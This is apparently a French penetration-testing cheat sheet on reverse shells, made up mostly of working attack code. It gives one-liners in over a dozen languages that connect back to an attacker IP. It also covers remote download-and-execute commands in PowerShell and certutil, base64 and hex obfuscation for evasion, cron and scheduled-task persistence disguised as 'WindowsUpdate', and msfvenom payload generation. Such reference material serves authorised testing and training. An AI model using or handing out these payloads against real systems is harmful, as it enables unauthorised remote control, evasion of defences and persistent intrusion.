# Reverse Shells — Technique

> Créer, stabiliser et maintenir des reverse shells sur différentes plateformes et langages.

---

## Présentation

Un **reverse shell** est une connexion réseau où la **machine cible** initie la connexion vers la **machine attaquante**, contrairement à un bind shell où l'attaquant se connecte à la cible.

**Avantages** :
- Contourne les pare-feu sortants (plus permissifs que l'entrant)
- Pas besoin d'ouvrir de port sur la cible
- Fonctionne souvent même avec NAT/proxy

**Principe** :
```
[Attaquant] <--- Connexion initiée par --- [Cible]
   (écoute)                                (exécute payload)
```

### Configuration de l'attaquant — Listener Netcat

```bash
# Listener simple
nc -lvnp 4444

# Avec verbosité accrue
nc -lvvnp 4444

# Sur interface spécifique
nc -lvnp 4444 -s 10.10.14.5
```

**Options expliquées** :
- `-l` : Mode écoute (listen)
- `-v` : Mode verbeux (affiche les connexions)
- `-n` : Pas de résolution DNS (plus rapide)
- `-p` : Spécifie le port d'écoute

## Détection / Identification

Avant d'envoyer un payload, vérifier les interpréteurs/binaires disponibles sur la cible :

```bash
# Linux
which python python3 perl php nc ncat socat bash 2>/dev/null
ls -la /bin/nc* /usr/bin/nc* 2>/dev/null    # variante nc avec/sans -e

# Windows
where powershell
where nc.exe certutil
```

## Exploitation

### Linux / Multi-plateforme

**Bash**
```bash
# Méthode classique (TCP)
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# Méthode alternative (ex: dans une injection SQL sqlmap)
bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'

# Via exec (plus furtif)
0<&196;exec 196<>/dev/tcp/10.10.14.5/4444; sh <&196 >&196 2>&196

# One-liner avec encodage base64
echo "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1" | base64
# Résultat : YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQo=
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQo= | base64 -d | bash

# Via fichier
cat > /tmp/.shell.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
EOF
chmod +x /tmp/.shell.sh
/tmp/.shell.sh
```

**Netcat**
```bash
# Netcat traditionnel (avec -e)
nc -e /bin/sh 10.10.14.5 4444
nc -e /bin/bash 10.10.14.5 4444

# Netcat sans -e (BSD/OpenBSD)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f

# Netcat avec named pipe
mknod /tmp/backpipe p
/bin/sh 0</tmp/backpipe | nc 10.10.14.5 4444 1>/tmp/backpipe
```

**Socat**
```bash
# Reverse shell simple
socat TCP:10.10.14.5:4444 EXEC:/bin/bash

# Reverse shell avec TTY complet (pas de stabilisation nécessaire)
# Sur l'attaquant
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444

# Sur la cible
socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:10.10.14.5:4444
```

**Python**
```python
# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'

# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python 3 - version compacte
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.5",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
```

> Le one-liner Python 3 ci-dessus peut être sauvegardé tel quel dans un fichier (`shell.py`) et exécuté via `python3 shell.py` si un antivirus/EDR filtre l'exécution `-c` en ligne de commande.

**PHP**
```php
// exec
php -r '$sock=fsockopen("10.10.16.122",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

// shell_exec
php -r '$sock=fsockopen("10.10.14.5",4444);shell_exec("/bin/sh -i <&3 >&3 2>&3");'

// system
php -r '$sock=fsockopen("10.10.14.5",4444);system("/bin/sh -i <&3 >&3 2>&3");'
```

**Perl**
```perl
perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Perl sans /bin/sh
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.14.5:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

**Ruby**
```ruby
ruby -rsocket -e'f=TCPSocket.open("10.10.14.5",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Ruby sans /bin/sh
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.14.5","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

**Java**
```java
// Java Runtime
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.5/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
> Variante en pur Java (sans dépendre de `/bin/bash -c exec 5<>/dev/tcp`) : `Socket` connecté à l'attaquant + `ProcessBuilder("/bin/sh")` dont les flux stdin/stdout/stderr sont pompés vers/depuis la socket dans une boucle. Utile quand seul un JRE est disponible (webshell JSP/WAR sans `/dev/tcp`). Implémentation complète : PayloadsAllTheThings ou revshells.com (générateur "Java").

**Go (Golang)**
```go
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.10.14.5:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

**Rust**
```rust
use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};

fn main() {
    let s = TcpStream::connect("10.10.14.5:4444").unwrap();
    let fd = s.as_raw_fd();
    Command::new("/bin/sh")
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
}
```

**Lua**
```lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.10.14.5','4444');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

**AWK**
```bash
awk 'BEGIN {s = "/inet/tcp/0/10.10.14.5/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

**NodeJS**
```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4444, "10.10.14.5", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

### Windows

**PowerShell — one-liner**
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**PowerShell encodé en base64**
```powershell
$command = 'IEX(New-Object Net.WebClient).downloadString("http://10.10.14.5:8000/shell.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

powershell -enc $encodedCommand
```

**Nishang Invoke-PowerShellTcp.ps1**
```powershell
# Sur l'attaquant : héberger le script
python3 -m http.server 8000

# Sur la cible : télécharger et exécuter
powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.5 -Port 4444
```

> Le même code peut être servi comme fichier (`shell.ps1`) hébergé sur le serveur HTTP de l'attaquant et téléchargé/exécuté à distance — voir Nishang ci-dessus pour le pattern `IEX(New-Object Net.WebClient).downloadString(...)`.

**Windows CMD**
```cmd
# Via PowerShell
powershell -c "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5:8000/shell.ps1')"

# Via certutil (téléchargement)
certutil -urlcache -f http://10.10.14.5:8000/nc.exe nc.exe
nc.exe 10.10.14.5 4444 -e cmd.exe
```

### Techniques d'évasion

**Encodage Base64**
```bash
echo "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1" | base64
echo BASE64_STRING | base64 -d | bash
```

**Hex Encoding**
```bash
echo -n "/bin/bash" | xxd -p
echo 2f62696e2f62617368 | xxd -r -p | bash
```

**Obfuscation PowerShell**
```powershell
$h='10.10.14.5'
$p=4444
$c=New-Object System.Net.Sockets.TCPClient($h,$p)
```

**Ports courants (bypass firewall)**
```
53   # DNS
80   # HTTP
443  # HTTPS
8080 # HTTP alternatif
3389 # RDP
```

### Dépannage

**Le shell ne fonctionne pas — vérifications :**
1. Firewall sur l'attaquant ?
2. Port déjà utilisé ? (`ss -tulpn | grep 4444`)
3. IP correcte ? (`ip a show tun0`)
4. Syntaxe du payload correcte ?
5. Langage disponible sur la cible ?

**Le shell se ferme immédiatement**
```bash
# Ajouter une boucle infinie
while true; do bash -i >& /dev/tcp/10.10.14.5/4444 0>&1; sleep 10; done

# Ou rediriger stderr
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1 2>&1
```

**Pas de stabilisation possible**
```bash
# Utiliser script au lieu de python
script /dev/null -c bash

# Ou utiliser rlwrap côté attaquant
rlwrap nc -lvnp 4444
```

## Post-exploitation

### Stabilisation du shell

**Méthode 1 — Python PTY**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ou Python 2
python -c 'import pty;pty.spawn("/bin/bash")'
```

**Méthode 2 — Stabilisation complète (TTY), étape par étape**
```bash
# 1. Spawner un PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'

# 2. Background le shell (Ctrl+Z)
^Z

# 3. Configurer le terminal
stty raw -echo; fg

# 4. Réinitialiser le terminal (touche entrée)

# 5. Configurer les variables d'environnement
export SHELL=bash
export TERM=xterm-256color

# optionnel
stty rows 38 columns 116
alias ls='ls --color=auto'
alias grep='grep --color=auto'
export LS_COLORS='di=1;36:fi=0:ln=1;35:ex=1;32'
```

**Méthode 3 — Script (si Python n'est pas disponible)**
```bash
script /dev/null -c bash
```

### Persistance du reverse shell

**Cron Job (Linux)**
```bash
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'") | crontab -

# Ou directement dans /etc/crontab
echo "*/5 * * * * root bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'" >> /etc/crontab
```

**Script de reconnexion**
```bash
#!/bin/bash
while true; do
    bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
    sleep 60
done
```

**Windows Scheduled Task**
```powershell
schtasks /create /tn "WindowsUpdate" /tr "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/shell.ps1')\"" /sc minute /mo 5
```

### MSFVenom

```bash
# Linux x64
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf

# Windows x64
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe

# PHP
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.jsp

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war
```

## Vulnérabilités / Misconfigurations classiques

| Faiblesse | Impact |
|---|---|
| Pare-feu sortant absent ou trop permissif | Reverse shell établi sans restriction |
| Ports courants (80/443/53) non filtrés en sortie | Bypass facile des règles de pare-feu strictes |
| Langages d'interprétation (python/perl/php) présents et accessibles | Large choix de payloads disponibles |
| Pas de contrôle applicatif sur les fonctions dangereuses (`eval`, `exec`, `system`) | Point d'entrée pour obtenir un reverse shell via une vulnérabilité applicative |

## Outils de référence

| Outil | Usage |
|---|---|
| `nc` / `ncat` | Listener, bind/reverse shell simple |
| `socat` | Reverse shell avancé, relais, TTY complet |
| `rlwrap` | Historique/édition de ligne sur un listener netcat |
| `msfvenom` | Génération de payloads reverse shell (tous formats) |
| revshells.com | Générateur web de one-liners, auto-remplissage IP/port |
| PayloadsAllTheThings | Catalogue exhaustif de payloads par langage |

## Ressources

- RevShells.com : https://www.revshells.com/
- PayloadsAllTheThings : https://github.com/swisskyrepo/PayloadsAllTheThings
- HackTricks : https://book.hacktricks.xyz/generic-methodologies-and-resources/shells
- PentestMonkey : https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- GTFOBins : https://gtfobins.github.io/
